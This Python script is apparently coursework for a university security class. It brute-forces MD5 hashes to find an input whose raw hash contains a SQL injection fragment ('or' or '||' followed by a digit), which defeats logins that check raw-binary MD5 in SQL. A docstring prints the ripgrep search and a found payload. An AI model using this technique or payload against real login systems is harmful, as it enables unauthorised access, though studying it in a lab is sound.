import hashlib
import multiprocessing  
import random
import re
import string     
from typing import Optional


# Hex representation of the single quote character for use in the regex
re_single_quoute = hex(ord("'"))[2:]

# Hex representation of the OR operator for use in the regex, in both uppercase and lowercase forms and the double pipe character
re_sql_or1 = hex(ord('O'))[2:] + hex(ord('R'))[2:]
re_sql_or2 = hex(ord('O'))[2:] + hex(ord('r'))[2:]
re_sql_or3 = hex(ord('o'))[2:] + hex(ord('R'))[2:]
re_sql_or4 = hex(ord('o'))[2:] + hex(ord('r'))[2:]
re_sql_or5 = hex(ord('|'))[2:] + hex(ord('|'))[2:]

# Combine the OR operators into a single regex group
re_sql_ors = f"(({re_sql_or1})|({re_sql_or2})|({re_sql_or3})|({re_sql_or4})|({re_sql_or5}))"

# Hex representation of the digits 1-9 for use in the regex
re_digit1 = hex(ord('1'))[2:]
re_digit2 = hex(ord('2'))[2:]
re_digit3 = hex(ord('3'))[2:]
re_digit4 = hex(ord('4'))[2:]
re_digit5 = hex(ord('5'))[2:]
re_digit6 = hex(ord('6'))[2:]
re_digit7 = hex(ord('7'))[2:]
re_digit8 = hex(ord('8'))[2:]
re_digit9 = hex(ord('9'))[2:]

# Combine the digits into a single regex group
re_digits = f"({re_digit1}|{re_digit2}|{re_digit3}|{re_digit4}|{re_digit5}|{re_digit6}|{re_digit7}|{re_digit8}|{re_digit9})"

# Combine the regex groups into a single regex pattern
regex = f".*{re_single_quoute}{re_sql_ors}{re_single_quoute}{re_digits}"

# Print regex for use in the ripgrep command
print(regex)

def generate_hash(filename, rounds=30):
    with open(filename, "w") as file:

        for _ in range(rounds):
            entries = []
            strings = [''.join(random.choice(string.digits) for _ in range(37)) for _ in range(1_000_000)]
            for s in strings:
                md5_hash = hashlib.md5()
                md5_hash.update(s.encode())
                entries.append(f"{s}:{md5_hash.hexdigest()}\n")
            file.writelines(entries)


def generate_hashes():
    pool = multiprocessing.Pool(multiprocessing.cpu_count())
    output_filenames = [f"hashes{i}.txt" for i in range(multiprocessing.cpu_count())]
    results = pool.map(generate_hash, output_filenames)

if __name__ == "__main__":
    """

    Probably won't be able to design a regex that matches the payload in a reasonable amount of time.
    Instead, we can generate a few gigabytes worth of key:hash pairs in parallel and then use ripgrep to search for the payload:

    1. Generate a few gigabytes worth of key:hash pairs in parallel.

    2. Use ripgrep (https://github.com/BurntSushi/ripgrep?tab=readme-ov-file#installation) to search for payload:
        PS C:\Users\18454\UIUC\cs461> rg ".*27((4f52)|(4f72)|(6f52)|(6f72)|(7c7c))27(31|32|33|34|35|36|37|38|39)"
        hashes3.txt
        22161989:7626868841653025129864474194524269961:1dee225cc68bdec4277c7c27382b53ba
        PS C:\Users\18454\UIUC\cs461> 
    """
    generate_hashes()
